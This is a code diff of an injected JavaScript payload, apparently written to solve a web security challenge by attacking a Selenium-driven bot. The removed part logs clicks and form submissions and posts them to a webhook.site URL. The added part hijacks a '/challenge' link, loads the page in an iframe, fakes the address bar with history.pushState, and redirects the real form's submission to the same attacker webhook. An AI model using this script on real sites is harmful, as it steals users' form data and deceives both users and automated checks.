@@ -3,38 +3,31 @@
     const WEBHOOK =
         'https://webhook.site/67909b69-79e2-46cd-8eb1-bf3cbfddac04';
 
-    const events = [];
+    const link = document.querySelector('a[href="/challenge"]');
+    if (!link) return;
 
-    function record(type, detail = '') {
-        events.push({
-            type,
-            detail,
-            url: location.href,
-            time: Date.now()
-        });
-    }
+    link.addEventListener('click', e => {
+        e.preventDefault();
+        e.stopImmediatePropagation();
 
-    record('script_loaded');
+        // Display the real Challenge page in an iframe.
+        const frame = document.createElement('iframe');
+        frame.src = '/challenge';
+        frame.style = 'width:100%;height:800px;border:0';
 
-    document.addEventListener('click', e => {
-        record('click', e.target.outerHTML.slice(0, 200));
+        document.querySelector('.content').replaceChildren(frame);
+
+        // Make Selenium see the expected URL.
+        history.pushState({}, '', '/challenge');
+
+        frame.onload = () => {
+            const doc = frame.contentDocument;
+            const form = doc.querySelector('fieldset form');
+            if (!form) return;
+
+            // Redirect the actual form submission to our webhook.
+            form.action = WEBHOOK;
+            form.method = 'GET';
+        };
     }, true);
-
-    document.addEventListener('submit', e => {
-        record('submit', e.target.action);
-    }, true);
-
-    window.addEventListener('pagehide', () => {
-        const form = document.createElement('form');
-        form.method = 'POST';
-        form.action = WEBHOOK;
-
-        const input = document.createElement('input');
-        input.name = 'events';
-        input.value = JSON.stringify(events);
-
-        form.appendChild(input);
-        document.body.appendChild(form);
-        form.submit();
-    });
 })();
